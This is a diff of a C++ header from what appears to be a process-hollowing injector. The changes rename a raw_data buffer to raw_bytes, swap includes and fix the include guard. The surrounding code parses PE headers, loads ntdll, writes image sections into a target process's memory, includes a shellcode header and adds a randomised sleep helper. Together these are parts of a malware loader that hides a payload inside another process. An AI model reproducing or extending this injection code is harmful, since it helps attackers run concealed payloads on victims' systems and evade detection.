@@ -1,17 +1,13 @@
+#ifndef PROCESS_HOLLOWING_PROCESS_HPP
+#define PROCESS_HOLLOWING_PROCESS_HPP
+
 #include "shellcode.h"
-#include <filesystem>
-#include <iostream>
-#include <memoryapi.h>
+#include <ntdef.h>
 #include <optional>
 #include <processthreadsapi.h>
 #include <random>
 #include <winbase.h>
-
-#ifndef PROCESS_HOLLOWING_PE_H
-#define PROCESS_HOLLOWING_PE_H
-
-// always use smart pointers instead of raw pointers to manage memory more efficiently and avoid memory leaks
-
+#include <winnt.h>
 namespace util {
     unsigned int generate_random_sleep_duration(unsigned int min_duration, unsigned int max_duration) {
         static std::random_device rd;
@@ -40,11 +36,11 @@ namespace util {
 
 namespace process {
     auto get_nt_header(PIMAGE_DOS_HEADER dos_header) {
-        return reinterpret_cast<PIMAGE_NT_HEADERS64>(raw_data + dos_header->e_lfanew);
+        return reinterpret_cast<PIMAGE_NT_HEADERS64>(raw_bytes + dos_header->e_lfanew);
     }
 
     auto get_section_header(PIMAGE_DOS_HEADER dos_header) {
-        return reinterpret_cast<PIMAGE_SECTION_HEADER>(raw_data + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
+        return reinterpret_cast<PIMAGE_SECTION_HEADER>(raw_bytes + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
     }
 
     auto load_ntdll() -> std::optional<HMODULE> {
@@ -95,7 +91,7 @@ namespace process {
     auto write_sections(PIMAGE_SECTION_HEADER section_header, PVOID new_image_base, PIMAGE_NT_HEADERS nt_header, HANDLE process) {
         for (WORD i = 0; i < nt_header->FileHeader.NumberOfSections; ++i) {
             PVOID section_dest = reinterpret_cast<PBYTE>(new_image_base) + section_header[i].VirtualAddress;
-            PVOID section_src = reinterpret_cast<PBYTE>(raw_data) + section_header[i].PointerToRawData;
+            PVOID section_src = reinterpret_cast<PBYTE>(raw_bytes) + section_header[i].PointerToRawData;
             SIZE_T section_size = section_header[i].SizeOfRawData;
             if (!write_process_memory(process, section_dest, section_src, section_size)) {
                 std::cerr << "Failed to write section " << i << " to target process" << std::endl;
@@ -105,4 +101,4 @@ namespace process {
 }
 
 
-#endif//PROCESS_HOLLOWING_PE_H
+#endif//PROCESS_HOLLOWING_PROCESS_HPP
